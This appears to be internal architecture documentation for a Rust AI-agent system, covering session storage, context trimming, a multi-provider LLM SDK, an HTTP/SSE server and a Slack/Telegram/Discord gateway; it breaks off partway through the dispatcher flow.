Generic over `State`. `HookRegistry<State>` = `HashMap<LifecycleEvent, Vec<Box<dyn Hook<State>>>>` sorted by `priority()`. `execute_hooks()` iterates in order, stopping on `HookAction::Skip` or `Abort`. `define_hook!` macro reduces boilerplate. `LifecycleEvent` enum names the discrete hook points.

This is **NOT the same as `agent_core::AgentHook`** — `shared::Hook` is a more generic system used inside `api` for the context-manager hooks; `agent_core::AgentHook` is the runtime-loop observation seam. `api::TaskBoardContextHook` bridges the two.

---

### `stakpak-api` — storage layer (`storage.rs`)

Backend: **libsql** (SQLite-compatible, file-backed). `LocalStorage` (`local/storage.rs:23`) holds a `libsql::Database`, opens a fresh `Connection` per operation. `StakpakStorage` is the remote HTTP impl. Both implement `SessionStorage` trait (`storage.rs:25`).

```rust
SessionStorage methods:
    list_sessions, get_session, create_session, update_session, delete_session
    list_checkpoints, get_checkpoint, create_checkpoint
    get_active_checkpoint (default; reads via get_session)

CheckpointState (storage.rs:285) {
    messages: Vec<ChatMessage>,                  // OpenAI-shaped wire format
    metadata: Option<serde_json::Value>,         // freeform; holds trim state
}

Checkpoint (storage.rs:264) {
    id: Uuid,
    session_id: Uuid,
    parent_id: Option<Uuid>,                     // chain
    state: CheckpointState,
    created_at, updated_at,
}

Session (storage.rs:231) {
    active_checkpoint: Option<Checkpoint>,
    ...
}
```

Migrations: `libs/api/src/local/migrations/`.

### `AgentState` (`models.rs:557`)

```rust
AgentState {
    active_model:   stakai::Model,
    messages:       Vec<ChatMessage>,            // raw, source of truth
    tools:          Option<Vec<Tool>>,
    llm_input:      Option<LLMInput>,            // populated by BeforeInference hook
    llm_output:     Option<LLMOutput>,
    metadata:       Option<serde_json::Value>,   // mirrors CheckpointState.metadata
}
```

This is the `State` parameter passed to `HookContext<AgentState>`. Only `messages` and `metadata` survive a checkpoint round-trip.

### Three context-manager strategies (`local/context_managers/`)

Trait `ContextManager` has one method: `fn reduce_context(&self, messages: Vec<ChatMessage>) -> Vec<LLMMessage>`.

| Strategy | File:Line | When | Preserves | Discards |
|---|---|---|---|---|
| `SimpleContextManager` | `simple_context_manager.rs:7` | Minimal/legacy | Last message verbatim (with images); all prior flattened to `"role: content\n..."` text | Message boundaries, tool call structure, all prior images |
| `TaskBoardContextManager` | `task_board_context_manager.rs:8` | **Default production** | Individual `LLMMessage` structure; last N assistant messages full; user/system always full | Older assistant+tool content (replaced with `"[trimmed]"`) when over `context_window × threshold` |
| `FileScratchpadContextManager` | `file_scratchpad_context_manager.rs:22` | Agent manages external scratchpad/todo files | FS state of `scratchpad.md` + `todo.md`; recent action structure as XML | Older action results (placeholder); older action messages over size limit; non-last scratchpad tool calls |

A fourth `ScratchpadContextManager` (`scratchpad_context_manager.rs:10`) extracts inline `<scratchpad>` XML tags into a summarised user message.

### `TaskBoardContextManager::reduce_context_with_budget()` pipeline

1. `clean_checkpoint_tags()` — strip `<checkpoint_id>...</checkpoint_id>` XML from `ChatMessage.content` so checkpoint IDs don't consume context tokens
2. `ChatMessage → LLMMessage` (via `From<ChatMessage>` impl)
3. `merge_consecutive_same_role()` (`task_board_context_manager.rs:374`) — merge consecutive `role=tool` into one message with `List` of `ToolResult` parts (Anthropic API correctness)
4. `dedup_tool_results()` (`task_board_context_manager.rs:409`) — drop all but last `ToolResult` per duplicated `tool_use_id`
5. **Budget trimming** — re-apply previous trim boundary from `metadata.trimmed_up_to_message_index`, advance only if `estimate_tokens() + tool_overhead > threshold`

### Token estimation (`task_board_context_manager.rs:106`)

- `BYTES_PER_TOKEN = 3.0`
- Per-message overhead = 8 tokens
- Per-part (in `List`) = 3 tokens
- ToolCall/ToolResult structural overhead = +30 bytes (IDs, type fields)
- Image flat = 2000 tokens
- Final 5% safety buffer: `(raw * 1.05).ceil()`
- `estimate_tool_overhead()` (`:162`) applies 1.2× multiplier on tool-schema byte length

Threshold = `context_window × context_budget_threshold` (default 0.8). The `context_window` passed in is **already reduced** by `system_prompt_tokens + max_output_tokens` (`task_board_context/mod.rs:52-59`).

### Hooks (`local/hooks/`)

Three hook structs:

- **`TaskBoardContextHook`** (`task_board_context/mod.rs:13`) — registered for `BeforeInference`. Reads `ctx.state.metadata.trimmed_up_to_message_index`, calls `reduce_context_with_budget()`, writes result to `ctx.state.llm_input` and updated metadata back. Default `keep_last_n=50`, `threshold=0.8`.
- **`InlineScratchpadContextHook`** — analogous, uses `ScratchpadContextManager`.
- **`FileScratchpadContextHook`** — uses `FileScratchpadContextManager`.

### Invariants

- **Cache-friendliness**: trim boundary monotonically non-decreasing; previously-trimmed prefix re-trimmed first on every call. Anthropic prompt cache stays valid.
- **Metadata persistence chain**: `CheckpointState.metadata` → loaded into `AgentState.metadata` on resume → mutated by `TaskBoardContextHook` → caller (`agent-core`) must call `save_checkpoint()` to persist. If save fails, trim index is lost (safe but wasteful).
- **`ChatMessage` vs `LLMMessage` boundary**: never mix. Context managers are the only conversion point.
- **`tool` role merging**: load-bearing — Anthropic rejects multiple consecutive user messages and `role=tool` maps to user.

### Mirror Notes

- **Domain-specific**: `ProvisionerType` / `Block` / `Document` (Stakpak IaC concepts); `privacy_rules.toml` / `additional_rules.toml` (Stakpak's PII choices); `memorize_session` / `search_memory` / `slack_*` methods on `AgentProvider`.
- **Framework**: `ContextManager` trait + 3 strategies (covers minimal, budget-aware-with-cache-stable-prefix, file-externalised); `HookRegistry<State>` + `define_hook!` + `LifecycleEvent` (priority-ordered, Continue/Skip/Abort); `CheckpointState { messages, metadata }` two-field design (any hook can attach state without schema migration); `LLMMessage` hierarchy (clean isomorphism with Anthropic content blocks).
- **Seams**: implement `SessionStorage` to swap libsql for Postgres/Redis/remote; implement `ContextManager` to add a fourth strategy; implement `Hook<YourState>` for any lifecycle interception; `metadata: Option<Value>` on both `CheckpointState` and `AgentState` is the **designated extension point**.

---

## 10. `stakai` (libs/ai) — provider-agnostic LLM SDK

### Purpose

A standalone Rust async SDK providing a unified interface for text completions across **6 backends**: Anthropic, OpenAI, Gemini, AWS Bedrock, GitHub Copilot, and Stakpak's own gateway. Streaming via `futures::Stream`. Optional OpenTelemetry GenAI tracing behind `tracing` feature.

### Public API (`libs/ai/src/lib.rs`)

```rust
// Client
Inference, InferenceConfig
ClientBuilder

// Errors
Error, Result

// Registry
ProviderRegistry, fetch_models_dev, get_available_models

// Types — re-exported from types/
Message, Role, MessageContent, ContentPart
GenerateRequest, GenerateOptions, GenerateResponse, ResponseContent, Usage
StreamEvent, GenerateStream
Model, ModelLimit
Tool, ToolChoice
ProviderOptions, AnthropicOptions, OpenAIOptions, GoogleOptions, ThinkingOptions, ReasoningEffort
Headers
CacheStrategy

// Prelude — subset for 90% of uses
prelude::*
```

### Top-level entry types

#### `Inference` (client) — `client/mod.rs:21`

Created via `Inference::new()` (env-based) or `Inference::with_config(InferenceConfig)` or `Inference::builder()`.

| Method | Behaviour |
|---|---|
| `generate(&request) -> Result<GenerateResponse>` | Blocking round-trip; OTel span if `tracing` on |
| `stream(&request) -> Result<GenerateStream>` | Returns `futures::Stream`; auto-wraps OTel span |
| `registry() -> &ProviderRegistry` | Underlying registry for model listing |

Both delegate to `generate_internal` / `stream_internal` (`client/mod.rs:202, 316`) which call `registry.get_provider(&request.model.provider)` and dispatch.

#### `GenerateRequest` (`types/request.rs:11`)

```rust
GenerateRequest {
    model: Model,                          // Model::custom("id", "provider")
    messages: Vec<Message>,
    options: GenerateOptions,              // temp, max_tokens, top_p, stop, tools, tool_choice, headers, session_id, cache_strategy
    provider_options: Option<ProviderOptions>,
    telemetry_metadata: Option<HashMap<String, String>>,
}
```

#### `Message`, `Role`, `ContentPart` (`types/message.rs:8, 197, 239`)

`Role`: `System | User | Assistant | Tool`.

`MessageContent` enum: `Text(String) | Parts(Vec<ContentPart>)` — custom serde to serialise as bare string OR array (matches API wire formats).

`ContentPart` variants:
- `Text { text, provider_options }`
- `Image { url, detail, provider_options }`
- `ToolCall { id, name, arguments, provider_options, metadata }` ← **`metadata` is the escape hatch for Gemini's `thought_signature`**
- `ToolResult { tool_call_id, content, provider_options }`

#### `StreamEvent` (`types/stream.rs:185`)

```rust
enum StreamEvent {
    Start          { id: String }
    TextDelta      { id, delta }
    ReasoningDelta { id, delta }                  // extended thinking / o1
    ToolCallStart  { id, name }
    ToolCallDelta  { id, delta }                  // partial JSON args
    ToolCallEnd    { id, name, arguments: Value, metadata: Option<Value> }
    Finish         { usage: Usage, reason: FinishReason }
    Error          { message }
}
```

`GenerateStream` (`stream.rs:29`) is a `pin_project` wrapper implementing `Stream<Item = Result<StreamEvent>>`. With `tracing` feature, it accumulates text + tool calls in-band and records on the OTel span at `Finish`.

### The `Provider` trait (THE seam)

`libs/ai/src/provider/trait_def.rs:9`:

```rust
#[async_trait]
pub trait Provider: Send + Sync {
    fn provider_id(&self) -> &str;
    fn build_headers(&self, custom_headers: Option<&Headers>) -> Headers;
    async fn generate(&self, request: GenerateRequest) -> Result<GenerateResponse>;
    async fn stream(&self, request: GenerateRequest) -> Result<GenerateStream>;
    async fn list_models(&self) -> Result<Vec<Model>> { Ok(vec![]) }
    async fn get_model(&self, id: &str) -> Result<Option<Model>> { /* default */ }
}
```

**Adding a new provider = one `impl Provider`.** The registry stores `Arc<dyn Provider>`.

### Provider implementations

#### Anthropic (`providers/anthropic/{mod,provider,convert,stream,types}.rs`)

`to_anthropic_request` (`convert.rs:45`):
- **`max_tokens` is required**; falls back to `infer_max_tokens(&model_id)` when unset
- `build_system_content_with_caching()` (`convert.rs:195`): system messages → `AnthropicSystemContent::String` (no cache) or `Blocks(Vec<AnthropicSystemBlock>)` (caching/OAuth). For OAuth, prepends Claude Code prefix block with 1-hour ephemeral cache.
- `build_messages_with_caching()` (`convert.rs:368`): **5-phase pipeline**
  1. Convert each message individually
  2. Merge consecutive same-role messages
  3. Per-message sanitisation (strip empty text, remove stale `cache_control`)
  4. Sequence sanitisation (enforce tool_use/tool_result pairing, remove orphans, ensure conversation starts with user)
  5. Apply tail cache breakpoints to last N messages
- `build_tools_with_caching()` (`convert.rs:312`): caches last tool; all tools get `input_schema` key (Anthropic's name vs OpenAI's `parameters`)
- **Extended thinking**: `ThinkingOptions` → `{ "type": "enabled", "budget_tokens": N }`. Claude Opus 4.7+ rewrites to `{ "type": "adaptive" }` (no budget_tokens) and **strips `temperature` and `top_p`**.

SSE parsing (`stream.rs:30`): tracks content blocks by index in `HashMap<u32, ContentBlock>`. Tool ID arrives in `content_block_start`; subsequent `input_json_delta` references by index. `ToolCallEnd` emitted at `content_block_stop`. `thinking_delta` → `ReasoningDelta`.

Auto-registration: `ANTHROPIC_API_KEY` env var (`registry/mod.rs:92`).

#### OpenAI (`providers/openai/{mod,provider,convert,stream,types,error,runtime}.rs`)

`to_openai_request` (`convert.rs:22`):
- Detects reasoning models (prefix `o1`, `o3`, `o4`, `gpt-5`); for them, **forces `temperature: None`** and converts system → `developer` role by default
- Two API paths: Chat Completions (`/chat/completions`) and Responses API (`/responses`), controlled by `OpenAIApiConfig` in `ProviderOptions::OpenAI`
- Tool calls serialise with `"type": "function"` and `arguments` as JSON string
- `stream_options: { include_usage: true }` injected automatically for streaming so usage appears in final chunk

Streaming (`stream.rs:35`): tool ID arrives on first delta chunk per index; subsequent chunks have `id: None`. `HashMap<u32, ToolCallState>` tracks by index. `ToolCallEnd` only when `finish_reason == "tool_calls"`.

Auto-registration: `OPENAI_API_KEY`.

#### Gemini (`providers/gemini/{mod,provider,convert,stream,types,options}.rs`)

`to_gemini_request` (`convert.rs:17`):
- System messages → separated into `GeminiSystemInstruction` (Gemini's separate field), **NOT prepended to message array**
- Tools → `GeminiTool { function_declarations }`; schema key is `parameters_json_schema`
- Tool mode: string constants `"AUTO" | "NONE" | "ANY"`
- Thinking: `GeminiThinkingConfig { include_thoughts: true, thinking_budget }`
- Cached content: `GoogleOptions::cached_content` → `cachedContent` request field
- Vision: `ContentPart::Image` → `GeminiInlineData` with base64 or URL

Streaming (`stream.rs:15`): does **NOT** use `reqwest-eventsource`. Reads raw HTTP byte stream, manually parses `data: {json}` lines, deserialises each as `GeminiResponse`. **`thought_signature` from function call responses is preserved as `metadata` on `ToolCallEnd` and must be echoed back in subsequent requests.**

Auto-registration: `GEMINI_API_KEY`.

### `ProviderOptions` (Vercel-AI-SDK pattern)

`types/request.rs:55` — tagged union `{ "provider": "anthropic"|"openai"|"google", ... }`:

| Variant | Inner type | Key fields |
|---|---|---|
| `Anthropic(AnthropicOptions)` | `request.rs:68` | `thinking: Option<ThinkingOptions>`, `effort: Option<ReasoningEffort>` |
| `OpenAI(OpenAIOptions)` | `request.rs:148` | `api_config: Option<OpenAIApiConfig>` (Completions or Responses), `system_message_mode`, `store`, `user` |
| `Google(GoogleOptions)` | `request.rs:229` | `thinking_budget: Option<u32>`, `cached_content: Option<String>` |

`OpenAIApiConfig` selects between `CompletionsConfig` (prompt cache key) and `ResponsesConfig` (reasoning_effort, summary, session_id, service_tier, cache_retention).

### Telemetry (feature `tracing`)

OTel span instrumentation following GenAI semantic conventions v1.38.0.

Standard attributes: `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.input.messages` (opt-in JSON), `gen_ai.output.messages` (opt-in JSON), `gen_ai.usage.input_tokens`, `gen_ai.usage.output_tokens`, `gen_ai.response.finish_reasons`. Cache extras: `gen_ai.usage.cache_read_input_tokens`, `gen_ai.usage.cache_write_input_tokens`.

For streaming, `GenerateStream::with_span()` (`stream.rs:62`) records all attributes at `StreamEvent::Finish`. Custom `request.telemetry_metadata` attached via `OpenTelemetrySpanExt::set_attribute` (raw key names, no prefix).

### Auto-registration (`registry/mod.rs:78`)

On `Inference::new()`:
1. `OPENAI_API_KEY` → register `OpenAIProvider` as `"openai"`
2. `ANTHROPIC_API_KEY` → register `AnthropicProvider` as `"anthropic"`
3. `GEMINI_API_KEY` → register `GeminiProvider` as `"google"`

**Bedrock requires explicit `InferenceConfig::bedrock(region)` and the `bedrock` Cargo feature.** Missing env var = provider silently absent; first call returns `Error::ProviderNotFound`.

### Invariants

- Anthropic requires `max_tokens`
- Anthropic strict role alternation; `build_messages_with_caching` enforces
- Tool ID tracking: index-based for OpenAI, content-block-index for Anthropic
- **Gemini `thought_signature`** must be echoed back in `ContentPart::ToolCall::metadata`
- Claude Opus 4.7+: strips `temperature`, `top_p`; reinterprets `ThinkingOptions` to adaptive

### Mirror Notes

- **Domain-specific**: `StakpakProvider` and `StakpakProviderConfig` (internal gateway); `fetch_models_dev` (Stakpak's model catalog service); OAuth Claude Code prefix; `CopilotProvider`
- **Framework**: 5-phase `build_messages_with_caching` pipeline; `CacheControlValidator` 4-breakpoint budget (Anthropic hard limit); content-block index tracking in SSE parsers; `GenerateStream` span attachment in `with_span()`
- **Seams**: implement `Provider` (4 methods minimum) + register with `ProviderRegistry::register()`. Add new `ProviderOptions` variant (tagged-union serde, backward-compatible). `ContentPart::ToolCall::metadata: Option<Value>` is the **designated extension point** for opaque provider data.

---

## 11. `stakpak-server` — Axum HTTP/SSE shell around `agent-core`

### Purpose

Wraps `agent_core::run_agent` in an Axum HTTP/SSE server. Owns session lifecycle (create/store/resume), in-memory run-state machine, event streaming, idempotent command delivery, local checkpoint caching. The AI loop itself stays in `agent-core`; this crate is **transport + orchestration shell**.

### HTTP routes

`routes.rs:254-303` splits into two Axum routers (public + protected) merged at startup.

| Method | Path | Auth | Purpose |
|---|---|---|---|
| GET | `/v1/health` | None | Liveness, version, uptime, sandbox status |
| GET | `/v1/openapi.json` | None | Generated OAS 3.1 doc |
| GET | `/v1/sessions` | Bearer | List sessions, paginated, filterable |
| POST | `/v1/sessions` | Bearer | Create; idempotent via `Idempotency-Key` |
| GET | `/v1/sessions/{id}` | Bearer | Detail + runtime config snapshot |
| PATCH | `/v1/sessions/{id}` | Bearer | Update title/visibility |
| DELETE | `/v1/sessions/{id}` | Bearer | Cancel active run, soft-delete |
| POST | `/v1/sessions/{id}/messages` | Bearer | Start new run OR send steering/follow-up; idempotent |
| GET | `/v1/sessions/{id}/messages` | Bearer | History from checkpoint |
| GET | `/v1/sessions/{id}/events` | Bearer | **SSE** stream of `AgentEvent` envelopes; `Last-Event-ID` replay |
| GET | `/v1/sessions/{id}/tools/pending` | Bearer | Poll pending tool calls |
| POST | `/v1/sessions/{id}/tools/{call_id}/decision` | Bearer | Approve/reject one tool; idempotent |
| POST | `/v1/sessions/{id}/tools/decisions` | Bearer | Bulk decisions; idempotent |
| POST | `/v1/sessions/{id}/tools/resolve` | Bearer | Alias for /decisions |
| POST | `/v1/sessions/{id}/cancel` | Bearer | Cancel run by run-scoped token; idempotent |
| POST | `/v1/sessions/{id}/model` | Bearer | In-flight model switch; idempotent |
| GET | `/v1/models` | Bearer | List configured catalog |
| GET | `/v1/config` | Bearer | Server runtime snapshot (`default_model`, `auto_approve_mode`) |

Gateway routes `/v1/gateway/*` are **NOT** in this crate; mounted by the binary that hosts both server and gateway.

### `SessionManager` FSM (`session_manager.rs`, types in `types.rs:51`)

```
                start_run() called
   Idle ─────────────────────────────► Starting{run_id}
    ▲                                       │
    │                                  actor spawned?
    │                       Yes ────────────┘──────────► Running{run_id, handle}
    │                       No  ────────────────────────► Failed{last_error}
    │
    └── mark_run_finished(Ok) ◄───── Running{run_id, handle}
                                            │
   Failed{last_error} ◄────────────────────┘  mark_run_finished(Err)
```

**Atomicity** (`session_manager.rs:53-66`): `start_run` acquires write lock, checks for `Starting`/`Running`, inserts `Starting{run_id}` — all in a single critical section before async actor spawn. Test `start_run_is_atomic_under_concurrency` (`:236`) verifies one wins, others get `SessionAlreadyRunning`.

**Run-mismatch protection** (`:158-163, :196-201`): `send_command` and `cancel_run` read active `run_id` from state, return `RunMismatch` (HTTP 409) if caller's `run_id` differs. Prevents stale clients commanding newer runs.

`SessionHandle` (`types.rs:9`) carries `mpsc::Sender<AgentCommand>` (cap 128, `session_actor.rs:52`) + `CancellationToken`.

### `session_actor` (`session_actor.rs:43-323`)

`spawn_session_actor` returns `SessionHandle` synchronously, then detaches a `tokio::spawn`ed task running `run_session_actor`:

1. **Checkpoint load** (`:94-120`): try `checkpoint_store.load_latest` (local file cache) → fallback `session_store.get_active_checkpoint` (remote/SQLite) via `message_bridge::chat_to_stakai`
2. **Tool/sandbox selection** (`:130-171`): persistent sandbox / ephemeral / server MCP client. **Tools snapshotted here** — later `refresh_mcp_tools` only affects new runs.
3. **Context assembly** (`:173-205`): `SessionContext` from environment, project discovery (`AGENTS.md`), skills, system prompt
4. **`AgentConfig` construction** (`:255-265`)
5. **Periodic checkpoint task** (`:225-240`): every `CHECKPOINT_FLUSH_INTERVAL = 5s`, persists `CheckpointRuntime` snapshot if dirty
6. **`run_agent` call** (`:275-290`)
7. **Cleanup** (`:292-322`): cancel periodic, shutdown ephemeral sandbox, clear pending tools, persist final checkpoint

`ServerCheckpointHook` (`session_actor.rs:532-578`) implements `AgentHook` — fires on `before_inference`, `after_inference`, `after_tool_execution`, `on_error`, each updating `CheckpointRuntime` for durable disk write within 5 s or on error.

### `EventLog` (`event_log.rs`)

```
EventLog = HashMap<Uuid, Arc<SessionEventBuffer>> behind Arc<RwLock>

SessionEventBuffer {
    next_id: AtomicU64,                          // monotonic, starts at 1, SeqCst
    ring:    Mutex<VecDeque<EventEnvelope>>,    // bounded; capacity from EventLog config
    tx:      broadcast::Sender<EventEnvelope>,  // cap = ring_capacity * 2
}
```

**Publish** (`:75-104`): atomic ID assign → push to ring → evict oldest if `ring.len() > capacity` → broadcast. All inside the ring's `Mutex`.

**Subscribe** (`:106-153`):
- `after_id = None` → live only
- `after_id = Some(cursor)`:
  - if `cursor + 1 < oldest_ring_id` → emit `GapDetected` control event, no replay
  - else → replay all `id > cursor`, then live

**`Last-Event-ID` semantics** (`routes.rs:693-698`): header parsed as `u64`, passed as `after_id`. **`gap_detected` resume hint**: `"refresh_snapshot_then_resume"` (fixed string).

SSE handler (`:703-730`):
1. `gap_detected` named SSE event (if any)
2. Each replay envelope as data event with `id`
3. Live broadcast events
4. Keep-alive comment frames every 15 s

### Idempotency (`idempotency.rs`)

```
storage_key = "METHOD:PATH:IDEMPOTENCY-KEY"     # path-scoped
body_hash   = DefaultHasher(serialised JSON body)
```

Lookup result: `Proceed | Replay(StoredResponse) | Conflict` (409 if same key, different body hash).

**TTL/eviction**: lazy — `prune_expired` runs on every lookup/save. No background sweeper. Retention from constructor (test = 10 ms, session-create = 60 s).

Routes call `prepare_idempotency` to check, `save_idempotency_response` after successful execution. Conflict returns 409 immediately.

### Checkpoint store (`checkpoint_store.rs`)

**Backend**: local filesystem, NO SQLite. Path: `$HOME/.stakpak/server/checkpoints/{session_id}/latest.checkpoint` (`:102-106`).

**One-per-session**: only `latest.checkpoint`, no history. Atomic write via `.tmp` rename (`:77-97`).

Envelope = `CheckpointEnvelopeV1` (from `agent-core`). Metadata adds `session_id`, `checkpoint_id` (remote), `active_model` (`session_actor.rs:742-755`). **Dual-write**: actor also calls `session_store.create_checkpoint` (remote/SQLite) and stores returned `checkpoint_id` in envelope metadata. Local file = hot cache; remote = durable.

### Message bridge (`message_bridge.rs`)

Two functions:
- `chat_to_stakai` (`:11`) — `Vec<ChatMessage>` (storage) → `Vec<stakai::Message>` (runtime), via `LLMMessage` pivot
- `stakai_to_chat` (`:19`) — reverse, only at checkpoint-persist time

Edge case test (`:52-81`): `tool_call_id` round-trip is explicit. **TODO at `session_actor.rs:722`**: remove this adapter once storage migrated to `Vec<stakai::Message>` directly.

### Auth (`auth.rs`)

`AuthConfig`:
- `no_auth = true` OR `auth_token = None` → all pass
- `auth_token = Some(token)` → `Authorization: Bearer <token>` exact match

`require_bearer` middleware applied **only to `protected_router`** via `route_layer`. Public router (`/v1/health`, `/v1/openapi.json`) merged without it. Both share `AppState`, merged before `.with_state(state)` (`routes.rs:254-258`).

### Runtime config (`state.rs`, `/v1/config`)

`AppState` carries: `run_manager`, `session_store`, `events`, `idempotency`, `inference`, `checkpoint_store`, `models`, `default_model`, `tool_approval_policy`, `mcp_client`, `mcp_tools`, `sandbox_config`, `persistent_sandbox`, `base_system_prompt`, `context_budget`, `project_dir`, `skills_context`, `pending_tools`.

**`RunOverrides` merge** (`routes.rs:545-583`) on `POST /messages` — priority order:
1. caller `overrides.model`
2. caller `model`
3. persisted model from last checkpoint metadata (`active_model`)
4. `AppState.default_model`
5. first model in catalog

`tool_approval_policy` and `system_prompt` similarly overridable per-message. Resulting `RunConfig` is **immutable** for the run's lifetime.

### OpenAPI (`openapi.rs`)

`utoipa` 5.4. All schema types are `*Doc` mirror structs with `#[derive(ToSchema)]`. Route stubs are empty `fn`s decorated `#[utoipa::path(...)]`. `ApiDoc` aggregates paths + components + `SecurityAddon` (Bearer scheme). To extend: add `*Doc` struct + stub fn + register in `ApiDoc`.

### Invariants

- Run-mismatch → 409. Stale client cannot command newer run.
- Tools snapshotted per run; `refresh_mcp_tools` affects only new runs.
- StakAI-native at HTTP boundary: `POST /messages` receives `stakai::Message` directly.
- Persistent vs ephemeral sandbox: if `Persistent` mode but `AppState.persistent_sandbox = None`, actor hard-fails (`:141-150`).
- Ring buffer eviction is lossy. Clients past ring rotation must fetch checkpoint via `GET /messages` then re-subscribe.

### Mirror Notes

- **Domain-specific**: session title/cwd; `AGENTS.md`/`APPS.md` discovery; skills loading; Stakpak remote checkpoint API; sandbox container image names.
- **Framework**: Axum public/protected router split + middleware on protected only; `SessionManager` FSM atomicity pattern; `EventLog` ring + broadcast design; `Last-Event-ID` + `gap_detected` semantics; idempotency `METHOD:PATH:KEY` storage-key format; temp-file-rename atomic writes; `AgentHook` for periodic checkpointing.
- **Seams**: `SessionManager` FSM (replace state enum w/o touching routes); `EventLog` (replace ring buffer with Redis pub/sub w/o changing callers); `CheckpointStore` (two-function interface); `SessionStorage` (entire persistence backend swappable).

---

## 12. `stakpak-gateway` — chat-platform bridge

### Purpose

Standalone process bridging Slack/Telegram/Discord to the server. Receives platform-native messages, posts to `/v1/sessions/.../messages`, subscribes SSE, streams replies, posts approval buttons when the policy demands and waits for user decision before resuming the run. SQLite makes routing-key→session-id mapping durable across restarts.

### Gateway HTTP routes (`api.rs:138-187`)

| Method | Path | Purpose |
|---|---|---|
| GET | `/status` | Health + uptime + active session count; no auth |
| GET | `/channels` | Connected channels + status; Bearer auth |
| GET | `/sessions` | All routing-key → session-id mappings; Bearer |
| GET | `/sessions/{session_id}` | Single session + active-run flag; Bearer |
| POST | `/send` | Deliver message; optionally start interactive agent run |

`/send` body: `{ channel, target: {…}, text, context?, interactive?: { prompt, caller_context[], model?, sandbox?, timeout?, title? } }`. Without `interactive` = fire-and-forget. With `interactive` = creates/reuses session, enqueues `InboundMessage`, stores one-shot `delivery_context`, returns `{ delivered, session_id, thread_id }`. Interactive sends require auth token (`api.rs:256-271`).

### Channel adapter trait (THE seam) — `channels/mod.rs:38-76`

Trait name: **`Channel`**.

| Method | Signature | Purpose |
|---|---|---|
| `id` | `fn id() -> &ChannelId` | Stable string ID (e.g. `"slack"`) |
| `display_name` | `fn display_name() -> &str` | For logs/API |
| `start` | `async fn start(inbound_tx, cancel) -> Result<()>` | Inbound listener; runs until `cancel` fires |
| `send` | `async fn send(reply: OutboundReply) -> Result<()>` | Deliver text |
| `send_with_receipt` | `async fn send_with_receipt(reply) -> Result<DeliveryReceipt>` | Like `send` but returns `{ message_id?, thread_id? }`; default = call send + empty receipt |
| `send_with_buttons` | `async fn send_with_buttons(reply, buttons) -> Result<String>` | Approval-gate prompt; returns `message_id` for later edit; default = error |
| `edit_message` | `async fn edit_message(message_id, new_text) -> Result<()>` | In-place edit (update approval status); default = error |
| `test` | `async fn test() -> Result<ChannelTestResult>` | Connectivity probe |

**Adding a new platform = one `impl Channel`.**

### Channel implementations

#### Slack (`channels/slack.rs`)

- **Inbound**: Slack Socket Mode (WebSocket). `apps.connections.open` with `app_token` → WSS URL. Persistent connection. Frames classified `event_callback` (messages) or `interactive` (button clicks). `DedupBuffer` (2048-slot ring) discards duplicate `event_ts`.
- **Outbound**: `chat.postMessage` with `bot_token`. Markdown → Block Kit via `slack_blocks.rs::markdown_to_slack_messages`. Large replies split into multiple posts.
- **Special**: `RECEIVED_REACTION = "eyes"` reaction added on inbound (`reactions.add`) as receipt. Replies always carry `thread_ts`. `send_with_buttons` posts Block Kit action buttons; returns `ts` as `message_id`. `edit_message` calls `chat.update`. `active_threads: Mutex<HashSet<(channel, thread_ts)>>`.
- Manifest: `libs/gateway/src/channels/slack-manifest.yaml` (OAuth scopes + event subscriptions).

#### Telegram (`channels/telegram.rs`)

- **Inbound**: long-polling `getUpdates` with `timeout=30`, filtered to `message` + `callback_query`
- **Outbound**: `sendMessage` with `parse_mode=MarkdownV2` and `reply_markup` for inline keyboards
- **Buttons**: `InlineKeyboardMarkup` Approve/Deny. Callback data wire format: `a:{approval_id}:{allow|deny}` (`channels/mod.rs:79-86`)
- Text limit: `TELEGRAM_TEXT_LIMIT = 4096` bytes

#### Discord (`channels/discord.rs`)

- **Inbound**: Discord Gateway WebSocket v10. `IDENTIFY` with `DISCORD_INTENTS = 37377` (guilds + message_content + DMs + reactions). Processes `MESSAGE_CREATE`, `INTERACTION_CREATE`.
- **Outbound**: REST `POST /channels/{id}/messages`. Text limit `DISCORD_TEXT_LIMIT = 2000`. `channel_cache` distinguishes public/private threads from regular channels.
- **Buttons**: `ActionRow` components (SUCCESS=3=green, DANGER=4=red). `edit_message` → `PATCH /channels/{id}/messages/{id}`. For `INTERACTION_CREATE`, sends deferred ACK (`type=6`) before posting callback.

### Routing (`router.rs:41-77`)

`resolve_routing_key` priority: peer-specific binding > channel-wide binding > default formula.

Default shapes:
- DM, `DmScope::Main` → `"main"`
- DM, `DmScope::PerPeer` → `"dm:{peer_id}"`
- DM, `DmScope::PerChannelPeer` (default) → `"{channel}:dm:{peer_id}"`
- Group → `"{channel}:group:{group_id}"`
- Thread → `"{channel}:thread:{group_id}:{thread_id}"`

**Each thread gets its own routing key → its own session.**

### Store (`store.rs`) — SQLite via libsql

Default path: `~/.stakpak/autopilot/gateway.db`. WAL + busy-timeout pragmas from `stakpak_shared::sqlite`.

**Table `sessions`** (`store.rs:332-343`):
- `routing_key TEXT PK | session_id TEXT | title | channel | peer_id | chat_type (JSON) | channel_meta (JSON) | created_at | updated_at`
- Indexes: `idx_sessions_session_id`, `idx_sessions_channel`

**Table `delivery_context`** (`store.rs:347-355`):
- `(channel, target_key) PK | context (JSON) | delivered_at | expires_at`
- One-shot: `pop_delivery_context` uses `DELETE … RETURNING` for atomic-once consumption

When `/send?interactive` carries a `context` object (e.g. `check_output`), it's stored and attached to the first inbound message from that target as `caller_context`. Hourly prune loop (`runtime.rs:160-175`).

### Dispatcher (`dispatcher.rs`) — central orchestrator

```
InboundMessage on mpsc::Receiver<InboundMessage>
  │
  ├─ approval_response? ── yes ──► handle_approval_response
  │
  └─ no
     ├─ resolve_routing_key(...)
     ├─ pop_delivery_context (one-shot, optional caller_context)
     ├─ store.get(routing_key) → existing?
     │     ├─ yes: update_delivery (refresh channel_meta + updated_at)
     │     └─ no:  client.create_session(title) → store.set(...)
     │
     ├─ is_run_active(session_id)?
     │     ├─ yes: enqueue_message + reject_pending_approval if any
     │     └─ no:  start_run
     │           ├─ build_run_overrides (profile > channel > global)
     │           ├─ client.send_messages(session_id, …) → run_id
     │           └─ spawn_run_consumer
     │                  └─ consume_run_events (SSE loop)
     │                        ├─ text_delta → buffer → flush → channel.send
     │                        ├─ tool_calls_proposed
     │                        │   ├─ AllowAll  → auto-accept all + notify
     │                        │   ├─ DenyAll   → auto-reject all + notify
     │                        │   └─ Allowlist → split: auto-accept listed,
     │                        │                  return ApprovalNeeded for rest
     │                        ├─ run_completed → RunOutcome::Completed
